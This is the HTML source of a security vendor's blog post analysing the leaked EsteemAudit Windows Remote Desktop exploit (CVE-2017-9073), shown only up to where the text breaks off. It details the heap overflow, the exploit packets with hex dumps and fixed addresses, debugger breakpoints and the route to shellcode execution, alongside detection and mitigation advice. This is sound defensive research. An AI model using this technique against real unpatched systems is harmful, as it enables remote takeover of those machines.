
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>A Dissection of the “EsteemAudit” Windows Remote Desktop Exploit</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="A Dissection of the “EsteemAudit” Windows Remote Desktop Exploit" />
<meta property="og:description" content="Unit 42 dissects the EsteemAudit Windows remote desktop exploit." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="CVE-2017-9073" />
<meta property="article:tag" content="EsteemAudit" />
<meta property="article:tag" content="ETERNALBLUE" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2017-05-31T12:00:19+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Unit 42 dissects the EsteemAudit Windows remote desktop exploit." />
<meta name="twitter:title" content="A Dissection of the “EsteemAudit” Windows Remote Desktop Exploit" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; A Dissection of the “EsteemAudit” Windows Remote Desktop Exploit Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/feed/" />
<meta property="og:likes" content="1"/>
<meta property="og:readtime" content="20"/>
<meta property="og:views" content="46,829"/>
<meta property="og:date_created" content="May 31, 2017 at 5:00 AM"/>
<meta property="og:post_length" content="6235"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Tao Yan"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/tao-yan/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"A Dissection of the \u201cEsteemAudit\u201d Windows Remote Desktop Exploit","name":"A Dissection of the \u201cEsteemAudit\u201d Windows Remote Desktop Exploit","description":"Unit 42 dissects the EsteemAudit Windows remote desktop exploit. ","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-dissection-esteemaudit-windows-remote-desktop-exploit\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-dissection-esteemaudit-windows-remote-desktop-exploit\/","datePublished":"May 31, 2017","articleBody":"Summary\nIn April, a group known as the \u201cShadow Brokers\u201d released a cache of stolen information that included multiple tools to exploit vulnerabilities in various versions of Microsoft Windows. The most famous of these is an exploit tool called \u201cEternalBlue\u201d which was repurposed to spread the WanaCrypt0r ransomware\/worm earlier this month. Another tool released in this dump is \u201cEsteemAudit\u201d, which exploits CVE-2017-9073, a vulnerability in the Windows Remote Desktop system on Windows XP and Windows Server 2003. Both versions of this operating system are no longer supported by Microsoft (XP ended in 2014, Server 2003 in 2015) and as such Microsoft has not released a patch for the vulnerability.\n\nOrganizations that still rely on these out-of-date operating systems need to ensure they are defending against exploitation of this vulnerability, as it allows a remote attacker to take control over the system without any authentication.\n\nPalo Alto Networks defends our customers\u2019 systems from this exploit in the following ways:\n\n \tTraps prevents exploitation of this vulnerability on Windows XP and Server 2003 hosts.\n \tThreat Prevention Signature 32533 released in Content Update 692 detects the exploit in the NGFW.\n\nOrganizations that cannot upgrade systems and do not use the protections describe above should consider disabling the smart card module through Group Policy or in the registry.\n\nExploitation of the vulnerability is complex, but the EsteemAudit tool makes it possible for novices to use it. The remainder of this blog includes a detailed analysis of where the vulnerability exists and how EsteemAudit exploits it.\nEsteemAudit Overview\nThis RDP remote exploit named EsteemAudit uses an inter-chunk heap overflow in an internal structure (named key_set with a size of 0x24a8) on the system heap allocated by gpkcsp.dll, which is a component of Windows Smart Card. In detail, there is 0x80 sized buffer (named key_data) in the key_set structure to store smart card information, after which there are two key_object pointers in adjacent memory. However, there is a call to memcpy in gpkcsp! MyCPAcquireContext with no boundary check, copying the entire user-controlled sized data to the location of 0x80 sized key_data. If the attacker puts more than 0x80 sized data as the source argument of memcpy, the key_object pointer adjacent with key_data will be overflowed. To exploit this, the EsteemAudit code puts the 0xb2-7 size controlled data as the source argument of memcpy, and overflowed key_object pointer with a fixed address 0x080190dc, which is an address of data section of gpkcsp.dll. After triggering the memcpy path to complete the overflow, the exploiter puts user-controlled data in that global variable at a fixed address 0x080190d8 in data section, and then triggers gpkcsp!ReleaseProvider to release the C++ object key_object (call [vtable+8]) to get control over EIP. Finally, the SharedUserData technique is used to call VirtualProtect by syscall with number 0x8f and the first stage shellcode is executed.\nIntroduction\nRemote RDP exploits are the stuff of legend. Fortunately, no public remote exploit for Windows RDP has been available since the NT4\/Win98 era. In April 2017, a group using the name \u201cThe Shadowbrokers\u201d released an RDP exploit named EsteemAudit which attacks the remote desktop service on Windows 2003 and Windows XP by using an inter-chunk heap overflow in the Smart Card component gpkscp.dll. In this blog, we will first describe some of the internals of remote desktop protocol and mechanism, and then analyze the EsteemAudit.exe itself. Next we will analyze the details about how to deal with the RDP data in kernel and user land, how the inter-chunk heap overflow occurs, and how to exploit this inter-chunk heap overflow to execute shellcode on the vulnerable system. Finally, we will introduce the possible detection methods and how to mitigate this vulnerability without a patch.\nMechanism and Protocol\nThe full details of how the Remote Desktop Protocol operates are out of scope for this blog, but in this section we\u2019ll describe the components which are relevant to this exploit.\nArchitecture and Components\nThe Terminal Services Architecture has four parts: multi-user kernel, the Remote Desktop client, the Terminal Services Licensing service, and Session Directory Services.\n\n\n\nFigure 1 Terminal Services Architecture Diagram \u2013 (Used with permission from Microsoft)\nThe following table describes the Terminal Services architecture components.\n\n\nFigure 2 Terminal Services Architecture Components \u2013 From Microsoft\n\nNicolas Collignon describes the relationships between these components in his paper named Tunneling TCP over RDP.\n\nIn the kernel-land, the relevant component is rdpwd.sys, which is responsible for MCS (Multipoint Communication Service) stack. The RDP PDU (Protocol Data Unit) are parsed and decrypted in this component.\n\nIn user-land, the winlogon component is most relevant. It is responsible for authentication of remote client. For example, if the client request a smart card redirection, the winlogon.exe will launch smart card component and communicate with the client.\nRDP Protocol\nWith the architecture and components of remote desktop service introduced, we can dive into the components of the Remote Desktop Protocol that are relevant to the vulnerability exploited by EsteemAudit. There are several RDP documents in MSDN documentation page which are relevant to this analysis. Some of them describe the basic protocol like, [MS-RDPBCGR]: Remote Desktop Protocol: Basic Connectivity and Graphics Remoting. Others describe extensions for RDP, like [MS-RDPESC]: Remote Desktop Protocol: Smart Card Virtual Channel Extension. Aur\u00e9lien Bordes listed all of the extensions at a talk at the OSSIR conference in 2010.\n\nFor the purposes of this analysis, we will consider the following components:\n\n \t[MS-RDPBCGR] - Remote Desktop Protocol: Basic Connectivity and Graphics Remoting\n \t[MS-RDPESC] - Remote Desktop Protocol: Smart Card Virtual Channel Extension\n \t[MS-RDPEFS] - Remote Desktop Protocol: File System Virtual Channel Extension\n \t[MS-RPCE] - Remote Procedure Call Protocol Extensions.\n\nMS-RDPBCGR is based on the ITU (International Telecommunication Union) T.120 series of protocols. The T.120 standard is composed of multiple other standards, and uses the X.224 standard for transport layer communications. The X.224 standard specified how RDP packets should be encrypted and we can see this in \u201crequest PDU\u201d and \u201cconfirm PDU\u201d requests.\n\nThe encryptionMethods flag in X.224 request in the example below is set to 0x00000012, which represents the client requesting the 128-bit RC4 encryption [128BIT_ENCRYPTION_FLAG 0x00000002] or FIPS[FIPS_ENCRYPTION_FLAG 0x00000010].\n\n\n\nFigure 3 X.224 Request PDU Specifying Encryption Methods\n\nThe server responds by confirming the encryptionMethod is 0x00000002 (128-bit RC4) in an X.224 confirm PDU message.\n\n\n\nFigure 4 X.224 Confirm PDU message Confirming Encryption Method (128-bit RC4)\n\nTo keep this blog from going outside the scope of the vulnerability we will not explain the remaining steps in the protocol connection process, but the details are available in in [MS-RDPBCGR] - Remote Desktop Protocol: Basic Connectivity and Graphics Remoting.\n\nAfter the RDP connection is created, the PDU between client and server will be encrypted with the negotiated encryption method (for example: 128-bit RC4). Below is an example of Client Info PDU.\n\n\n\nFigure 5 RDP Client Info PDU\n\nThe data included in this PDU is parsed out into the following components:\n\n\n\n64 00 04 03 eb 70 81 56 -&gt; PER encoded (ALIGNED variant of BASIC-PER) SendDataRequest\n\ninitiator = 1005 (0x03ed)\n\nchannelId = 1003 (0x03eb)\n\ndataPriority = high\n\nsegmentation = begin | end\n\nuserData length = 0x156 = 342 bytes\n\n&nbsp;\n\n48 00 -&gt; TS_SECURITY_HEADER::flags = 0x0048 0x0048 (SEC_INFO_PKT | SEC_ENCRYPT\n\n&nbsp;\n\n00 00 -&gt; TS_SECURITY_HEADER::flagsHi - ignored as flags field does not contain SEC_FLAGSHI_VALID (0x8000)\n\n6f 6d 0c d5 b7 0c 5d 7e -&gt; TS_SECURITY_HEADER1::dataSignature\n\n\n\nThe remaining data from the offset 0x51 to the end which begins with 86 b8 8a a9 is Encrypted TS_INFO_PACKET.\n\n\n\nlen\n\n0178d254\u00a0 0000014a\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 J...\n\n&nbsp;\n\nencrypted\n\n038e3c8b\u00a0 a98ab886 dabad90d d9d8f9e3 8dd5bafa\u00a0 ................\n\n038e3c9b\u00a0 1407ea51 883cb6af 21ca2bdb cab1e030\u00a0 Q.....&lt;..+.!0...\n\n038e3cab\u00a0 d6aaeccd 1c599171 1be8c40d 96d651dc\u00a0 ....q.Y......Q..\n\n038e3cbb\u00a0 2d018a22 242aac0d 7b58948f 4be28b23\u00a0 \"..-..*$..X{#..K\n\n038e3ccb\u00a0 36cf54c6 52b70939 4064362b 9e37e989\u00a0 .T.69..R+6d@..7.\n\n038e3cdb\u00a0 9ff09b06 4f862c80 1546198a ac9b03ed\u00a0 .....,.O..F.....\n\n038e3ceb\u00a0 420acbdf 566591c1 7f471159 0e1d6906\u00a0 ...B..eVY.G..i..\n\n038e3cfb\u00a0 906474f4 476ea91e 4db2edd2 fb464bfd\u00a0 .td...nG...M.KF.\n\n&nbsp;\n\nplain\n\n038e3c8b\u00a0 00000000 00000133 001a0000 00000000\u00a0 ....3...........\n\n038e3c9b\u00a0 00000000 00640061 0069006d 0069006e\u00a0 ....a.d.m.i.n.i.\n\n038e3cab\u00a0 00740073 00610072 006f0074 00000072\u00a0 s.t.r.a.t.o.r...\n\n038e3cbb\u00a0 00000000 00020000 0031001c 00320039\u00a0 ..........1.9.2.\n\n038e3ccb\u00a0 0031002e 00380036 0032002e 00320034\u00a0 ..1.6.8...2.4.2.\n\n038e3cdb\u00a0 0031002e 003c0000 003a0043 0057005c\u00a0 ..1...&lt;.C.:.\\.W.\n\n038e3ceb\u00a0 004e0049 0054004e 0053005c 00730079\u00a0 I.N.N.T.\\.S.y.s.\n\n038e3cfb\u00a0 00650074 0033006d 005c0032 0073006d\u00a0 t.e.m.3.2.\\.m.s.\n\n\n\nWe can parse the protocol details from plain TS_INFO_PACKET according the format described in [MS-RDPBCGR].\n\n\n\nFigure 6 Info Packet Structure from MS-RDPBCGR\nSmart Card Extension\nRDP has an extension which supports remote client login using a smart card. From [MS-RDPESC], we can find the protocol sequence and details of protocol flow.\n\n\n\nFigure 7 High Level Protocol Sequence Diagram from MS-RDPESC\n\n\n\nFigure 8 Protocol Flow Diagram from MS-RDPESC\n\nEsteemAudit uses the type of SCARD_IOCTL_TRANSMIT to communicate with the smart card module on the server.\n\n\n\nFigure 9 SCARD_IOCTL_TRANSMIT description from MS-RDPESC\n\nAs the specification states, the packet returned to a client by the server has a type of Transmit_Return. The specification describes the various fields this packet includes.\n\n\n\nFigure 10: Transmit_Return description from MS-RDPESC\n\nThe packet sent from server to server has a type of Transmit_Call.\n\n\n\nFigure 11 Transmit_Call description from MS-RDPESC\nRDP Exploit Client (EsteemAudit.exe)\nAfter understanding the basic knowledge of architecture, components, protocol and communications of RDP, we can look specifically at what the EsteemAudit.exe exploit client does. EsteemAudit.exe is responsible for communicating with the RDP server just like an RDP Client according the RDP protocol. It emulates an RDP client using a smart card, and sends a smart card redirection authentication request to RDP server to force it to handle the data and structure sent by EsteemAudit using the smart card module gpkcsp.dll where the vulnerability exists.\nEsteemAudit.exe Overview\nAfter reverse engineering the EsteemAudit binary, we found the exploit-start function named GoRunExp at the address .text:00381009. We will not show the entire function for brevity, and only introduce the main execution flow here.\n\n\n\nGoRunExp\n\n\u00e0 InitializeInputParameters \/\/get the config information\n\n\u00e0 connect2Target\n\n\u00e0\u00e0initRDPLib\n\n\u00e0\u00e0emulateSmartCard\n\n\u00e0\u00e0connect2RDP\n\n\u00e0\u00e0registerCallback(CallBackFunction)\n\n\u00e0 RecvProcessSendPackets\n\n\u00e0 RdpLib_SendKeyStrokes \/\/ Sending Space Bar\n\n\u00e0 RecvProcessSendPackets\n\n\u00e0 buildExpBuffer\n\n\u00e0\u00e0build_all_x86\n\n\u00e0\u00e0\u00e0build_overflow_x86\n\n\u00e0\u00e0\u00e0build_exploit_x86\n\n\u00e0\u00e0\u00e0build_egg0_x86\n\n\u00e0\u00e0\u00e0\/\/set auth code, xor mask, open payload dll, etc\n\n\u00e0\u00e0\u00e0 build_egg1_payloadxxx\n\n\u00e0 RdpLib_SendKeyStrokes \/\/ Sending Enter key\n\n\u00e0 RecvProcessSendPackets\n\n\u2026\n\n\u00e0 RecvProcessSendPackets\n\n\u00e0\u00e0\/\/send smart card authentication redirection request, receive and process the according response, communicate with the server, in the last phase send the ExpBuffer(including overflow buffer, exploit and egg0 buffer) to the server to control the EIP, at last send the end response to server to end the first stage.\n\n\u00e0\u00e0\/\/to be mentioned, CallBackFunction registered in connect2Target will be called to process the response and prints logs like \u201cSELECT_FILE - GPK Card MF\u201d, \u201cGET_RESPONSE - data unit size\u201d, \u201cGET_RESPONSE - serial number\u201d.\n\n\u2026\n\n\n\nWe found that after the preparation work including connect2Target and building the exploit buffer, RecvProcessSendPackets is called repeatedly to receive and process the data from the server and send the buffer previously prepared back to it. RecvProcessSendPackets is responsible for all the details of communicating with smart card modules on the RDP server, which we discuss in an upcoming section. However, we will not introduce the details of this function, but focus on what packets RecvProcessSendPackets sends to exploit the vulnerability.\nOverflow Packet\nWhen building the overflow packet, there are only two effective fields: a value at the 0x8d offset and a constant 0x9000 at the 0x91 offset, all other fields are random data.\n\n\n\nFigure 12 build_overflow_x86 function assembling the exploit packet.\n\nTo see the complete data sent by client, we can inspect one of the overflow packets.\n\n\n\nFigure 13 Overflow Packet dissected in Wireshark\n\nAs described below, after the offset 0x51, the data named TS_INFO_DATA is encrypted. To decrypt the TS_INFO_DATA, we noticed that all of data are encrypted by client with the Libeay32!RC4 function.\n\nWe can get the prototype of the RC4 function -- RC4(key, len, in, out) by simply debugging it.\n\n\n\nFigure 14 Libeay32!RC4 disassembly.\n\nWe can then set a breakpoint before and after the RC4 function execution to print the in and out buffers retrieve the encrypted data and decrypted data.\n\n\n\nbu image00380000+0xab24 \".echo len;dc esp+10 L1;.echo rc4_in_buffer;dc poi(esp+8);gc\"\n\nbu image00380000+0xab39 \".echo rc4_out_buffer;dc poi(esp+0c);gc\"\n\n\n\nThe decrypted buffer gives us the content of the TS_INFO_DATA of the overflow packet.\n\n\n\nlen\n\n0178cf98\u00a0 000000fc\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ....\n\n&nbsp;\n\nencrypted\n\n038e8d6b\u00a0 0649efba dcb9b66b f63f676c a2ddcc3b\u00a0 ..I.k...lg?.;...\n\n038e8d7b\u00a0 56e1fb2e c9ed4e9c bf566979 4d9e3868\u00a0 ...V.N..yiV.h8.M\n\n038e8d8b\u00a0 5dffb177 af4531e2 cd87df84 18a3afff\u00a0 w..].1E.........\n\n038e8d9b\u00a0 56c96e10 7dd116d9 f1db47e2 b65bba04\u00a0 .n.V...}.G....[.\n\n038e8dab\u00a0 5d8892ca 324864cb 70bc4793 82be0c5b\u00a0 ...].dH2.G.p[...\n\n038e8dbb\u00a0 d5737937 512ce129 21738638 ca18a61a\u00a0 7ys.).,Q8.s!....\n\n038e8dcb\u00a0 58a5f061 fe8af8db f6c40f83 a975c925\u00a0 a..X........%.u.\n\n038e8ddb\u00a0 7da42561 8e0a740f b10381b2 ef4f3c00\u00a0 a%.}.t.......&lt;O.\n\n\u2026\n\ndecrypted\n\n038e8d6b\u00a0 000000f4 00000003 49434472 00000000\u00a0 ........rDCI....\n\n038e8d7b\u00a0 00000001 00000000 000000e0 00081001\u00a0 ................\n\n038e8d8b\u00a0 cccccccc 000000c0 00000000 00000000\u00a0 ................\n\n038e8d9b\u00a0 00000000 000000b2 00000001 000000b2\u00a0 ................\n\n038e8dab\u00a0 fce3940b f2c3bad3 7134f185 b595ac48\u00a0 ..........4qH...\n\n038e8dbb\u00a0 2d8186ec 56e66ee1 ca0e854f e618d890\u00a0 ...-.n.VO.......\n\n038e8dcb\u00a0 fcf78fcf 6972d722 8a3307d7 e1715046\u00a0 ....\".ri..3.FPq.\n\n038e8ddb\u00a0 6d3184f2 7eb82735 0c1d6f4b e6a262fe\u00a0 ..1m5'.~Ko...b..\n\n&nbsp;\n\n&nbsp;\n\nProtocol details [references: [MS-RDPESC].pdf, [MS-RDPEFS].pdf, [MS-RPCE].pdf]\n\n000000f4 -&gt;CodePage\n\n00000003 -&gt;Flags\n\nDevice Control Response (DR_CONTROL_RSP)\n\n-&gt;DeviceIoReply (16 bytes): DR_DEVICE_IOCOMPLETION\n\n4472 -&gt;RDPDR_CTYP_CORE 0x4472\n\n4943 -&gt;PAKID_CORE_DEVICE_IOCOMPLETION 0x4943\n\n00000000 -&gt;DeviceId (4 bytes)\n\n00000001 -&gt;CompletionId (4 bytes)\n\n00000000 -&gt;IoStatus (4 bytes)\n\n000000e0 -&gt;OutputBufferLength (4 bytes)\n\n-&gt;OutputBuffer (variable)\n\n00081001 cccccccc Type Serialization Version 1 header\n\n000000c0 -&gt;ObjectBufferLength (4 bytes)\n\n00000000 -&gt;Filler (4 bytes)\n\n00000000 -&gt;ReturnCode\n\n00000000 -&gt;dwProtocol\n\n000000b2 -&gt;cbRecvLength\n\n-&gt;pbExtraBytes\n\n00000001 000000b2\n\nfce3940b f2c3bad3 7134f185 b595ac48\n\n2d8186ec 56e66ee1 ca0e854f e618d890\n\nfcf78fcf 6972d722 8a3307d7 e1715046\n\n6d3184f2 7eb82735 0c1d6f4b e6a262fe\n\n&nbsp;\n\n\n\nAs the execution continues, we can extract the two fields from the memory dump which will trigger the buffer overflow.\nWINDBG&gt;dc 04fdd650+8d\n04fdd6dd  080190dc 00009000 d7d93015 9dd1e4b1  .........0......\nThe address 0x080190dc is important to note, we will introduce how it is involved in the exploit in the RDP Server section below.\nExploit Packet Analysis\nWhen building the exploit buffer, there are many interesting fields used in the buffer, like 0x11111111, 0x22222222 and 0x7ffe0300.\n\n\n\nFigure 15 The build_exploit_x86 function assmploying the exploit buffer.\n\n\n\nFigure 16 The exploit buffer in a live pcap.\n\nWe can extract the data for the exploit buffer the same way we did for the overflow buffer.\n\n\n\nencrypted\n\n038e9d83\u00a0 0d76b81e 51331ed0 b3b4b29d ba4a1aaa\u00a0 ..v...3Q......J.\n\n038e9d93\u00a0 ad0b26e1 c15daa1e 20079871 a18afe91\u00a0 .&amp;....].q.. ....\n\n038e9da3\u00a0 46d26828 a8883de7 8b54718e 33ebf243\u00a0 (h.F.=...qT.C..3\n\n038e9db3\u00a0 9d3d556b f8a4f6f8 4a29500c 5d06bd19\u00a0 kU=......P)J...]\n\n038e9dc3\u00a0 e6099604 4bc7dc66 92103b5e 6da27faa\u00a0 ....f..K^;.....m\n\n038e9dd3\u00a0 07420e27 c95b5664 79d50284 f7bbd1d3\u00a0 '.B.dV[....y....\n\n038e9de3\u00a0 79c389e1 f795e1cf bcb35b4d 69d0ef0c\u00a0 ...y....M[.....i\n\n038e9df3\u00a0 92beeadf 9010b061 763848d5 bc032358\u00a0 ....a....H8vX#..\n\n\u2026\n\n&nbsp;\n\nDecrypted\n\n038e9d83\u00a0 00000204 00000003 49434472 00000000\u00a0 ........rDCI....\n\n038e9d93\u00a0 00000001 00000000 000001f0 00081001\u00a0 ................\n\n038e9da3\u00a0 cccccccc 000001d0 00000000 00000000\u00a0 ................\n\n038e9db3\u00a0 00000000 000001c0 00000001 000001c0\u00a0 ................\n\n038e9dc3\u00a0 ada0d86e 08011e7a 0801118e 08005e85\u00a0 n...z........^..\n\n038e9dd3\u00a0 0800bedd 11111111 2a6bd248 972dc73e\u00a0 ........H.k*&gt;.-.\n\n038e9de3\u00a0 00000000 6431e6f0 08011fef 08019078\u00a0 ......1d....x...\n\n038e9df3\u00a0 abc45491 22222222 00000000 316f482f\u00a0 .T..\"\"\"\"....\/Ho1\n\n\u2026\n\n\n\nThe exploit buffer packet is also a Device Control Response (DR_CONTROL_RSP) with the kind set to DR_DEVICE_IOCOMPLETION (0x49434472). This is the same as the overflow buffer described earlier.\n\nThe final two packets of the first stage are the Select_MF and End Response messages, respectively. We only show the decrypted data here.\n\n\n\nlen\n\n0178cf98\u00a0 0000004c\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 L...\n\n&nbsp;\n\nplain\n\n038ead9b\u00a0 00000044 00000003 49434472 00000000\u00a0 D.......rDCI....\n\n038eadab\u00a0 00000001 00000000 00000030 00081001\u00a0 ........0.......\n\n038eadbb\u00a0 cccccccc 00000010 00000000 00000000\u00a0 ................\n\n038eadcb\u00a0 00000000 00000002 00000001 00000002\u00a0 ................\n\n038eaddb\u00a0 00000090 00000000 00000000\n\n&nbsp;\n\n&nbsp;\n\n\n\nThe length of pExtraBytes is two. Two two extra bytes \u201c90 00\u201d will be processed by smart card module on the Server.\nlen\n0178cf98  0000003c\nThe length of pExtraBytes is 0, it is just an end response. This completes the traffic from EsteemAudit, next we\u2019ll go into how the server processes this data.\nRDP Server\nWith the details on what the client send to the server and the protocol in the encrypted packet out of the way, we can start looking at how the server processes the packet and where the vulnerability is exploited.\nKernel Layer\nAs described in the Architecture and Component section, we know that the kernel component is responsible for receiving the RDP data. We need to identify the data entry point function that handles the RAW data sent from the client to the server.\n\nLook at the two stack traces below. It directly shows the execution flows when a DEVICE_IO packet arrives. Termdd is the core dispatcher, RDPWD is responsible for MCS stack ad we can get the raw data sent by client from RDPWD!MCSIcaRawInput. The next several functions parsed data layer by layer according to the RDP protocol described earlier.\n\n\n\nkd&gt; k\n\n# ChildEBP RetAddr\n\n00 baf3b32c f6e134ef rdpdr!DrExchangeManager::RecognizePacket+0x8\n\n01 baf3b350 f6e12e34 rdpdr!DrSession::ReadCompletion+0x95\n\n02 baf3b368 8081d741 rdpdr!DrSession::ReadCompletionRoutine+0x38\n\n03 baf3b398 f76895d8 nt!IopfCompleteRequest+0xcd\n\n04 baf3b3d4 f768a0d2 termdd!IcaChannelInputInternal+0x1f0\n\n05 baf3b3fc ba1a26e1 termdd!IcaChannelInput+0x3c\n\n06 baf3b430 ba19c3c1 RDPWD!WDW_OnDataReceived+0x181\n\n07 baf3b458 ba19c1b9 RDPWD!SM_MCSSendDataCallback+0x159\n\n08 baf3b4c0 ba19bfe0 RDPWD!HandleAllSendDataPDUs+0x155\n\n09 baf3b4dc ba1b9ba4 RDPWD!RecognizeMCSFrame+0x32\n\n0a baf3b504 ba19b06b RDPWD!MCSIcaRawInputWorker+0x346\n\n0b baf3b52c f768d194 RDPWD!MCSIcaRawInput+0x65\n\n0c baf3b550 baa92fcb termdd!IcaRawInput+0x58\n\n0d baf3bd90 f768c265 TDTCP!TdInputThread+0x371\n\n0e baf3bdac 809418f4 termdd!_IcaDriverThread+0x4d\n\n0f baf3bddc 80887f4a nt!PspSystemThreadStartup+0x2e\n\n10 00000000 00000000 nt!KiThreadStartup+0x16\n\n&nbsp;\n\nkd&gt; k\n\n# ChildEBP RetAddr\n\n00 f5a8b254 f6e14f22 rdpdr!RxLowIoCompletion+0x3a\n\n01 f5a8b260 f6e15291 rdpdr!DrDevice::CompleteRxContext+0x2a\n\n02 f5a8b284 f6e158b0 rdpdr!DrDevice::CompleteBusyExchange+0x4d\n\n03 f5a8b2cc f6e164b2 rdpdr!DrDevice::OnDeviceControlCompletion+0x116\n\n04 f5a8b2f0 f6e1269d rdpdr!DrDevice::OnDeviceIoCompletion+0x1ee\n\n05 f5a8b310 f6e1285a rdpdr!DrExchangeManager::OnDeviceIoCompletion+0x55\n\n06 f5a8b324 f6e1351f rdpdr!DrExchangeManager::HandlePacket+0x26\n\n07 f5a8b350 f6e12e34 rdpdr!DrSession::ReadCompletion+0xc5\n\n08 f5a8b368 8081d741 rdpdr!DrSession::ReadCompletionRoutine+0x38\n\n09 f5a8b398 f76c95d8 nt!IopfCompleteRequest+0xcd\n\n0a f5a8b3d4 f76ca0d2 termdd!IcaChannelInputInternal+0x1f0\n\n0b f5a8b3fc f53856e1 termdd!IcaChannelInput+0x3c\n\n0c f5a8b430 f537f3c1 RDPWD!WDW_OnDataReceived+0x181\n\n0d f5a8b458 f537f1b9 RDPWD!SM_MCSSendDataCallback+0x159\n\n0e f5a8b4c0 f537efe0 RDPWD!HandleAllSendDataPDUs+0x155\n\n0f f5a8b4dc f539cba4 RDPWD!RecognizeMCSFrame+0x32\n\n10 f5a8b504 f537e06b RDPWD!MCSIcaRawInputWorker+0x346\n\n11 f5a8b52c f76cd194 RDPWD!MCSIcaRawInput+0x65\n\n12 f5a8b550 f55b2fcb termdd!IcaRawInput+0x58\n\n13 f5a8bd90 f76cc265 TDTCP!TdInputThread+0x371\n\n14 f5a8bdac 809418f4 termdd!_IcaDriverThread+0x4d\n\n15 f5a8bddc 80887f4a nt!PspSystemThreadStartup+0x2e\n\n16 00000000 00000000 nt!KiThreadStartup+0x16\n\n\n\nWe can see the content of srcBuf through the comment from IDA pro when RDPWD!MCSIcaRawInputWorker call RDPWD!RecognizeMCSFrame.\n\n\n\nFigure 17 Content of srcBuf\n\nWe can also see how RDPWD!RecognizeMCSFrame decodes PER.\n\n\n\nFigure 18 RDPWD!RecognizeMCSFrame decodes PER-encoded MCS Domain PDU\n\nAfter parsing the MCS stack, RDPWD will parse the TS_DATA_INFO part. The data in TS_DATA_INFO is encrypted so the SM_MCSSendDataCallback function calls SMDecryptPacket-&gt; DecryptData-&gt;rc4 to decrypt the data first.\n\n\n\nFigure 19 Decrypting the TS_DATA_INFO data\n\nFor those who want to recreated this, you can also set breakpoint in RDPWD!rc4 function which is a similar implementation with libeay32 like we did in the client to see encrypted and decrypted data on the server.\n\nNext, the SM_MCSSendDataCallback function calls WDW_OnDataReceived will handle the decrypted data.\n\n\n\nFigure 20 WDW_OnDataReceived Function Call\n\nAfter this, the function calls termdd!IcaChannelInput to dispatch decrypted data to different channels. In this example, the buffer overflow packet sent by EsteemAudit is the Device IO packet which is a part of File System Virtual Channel Extension and will be parsed by RDPDR module.\n\nWe can find the DR_DEVICE_IOCOMPLETION [MS-RDPEFS.pdf] header in the decrypted buffer overflow packet.\n\n\n\n000000f4 -&gt;CodePage\n\n00000003 -&gt;Flags\n\nDevice Control Response (DR_CONTROL_RSP)\n\n-&gt;DeviceIoReply (16 bytes): DR_DEVICE_IOCOMPLETION\n\n4472 -&gt;RDPDR_CTYP_CORE 0x4472\n\n4943 -&gt;PAKID_CORE_DEVICE_IOCOMPLETION 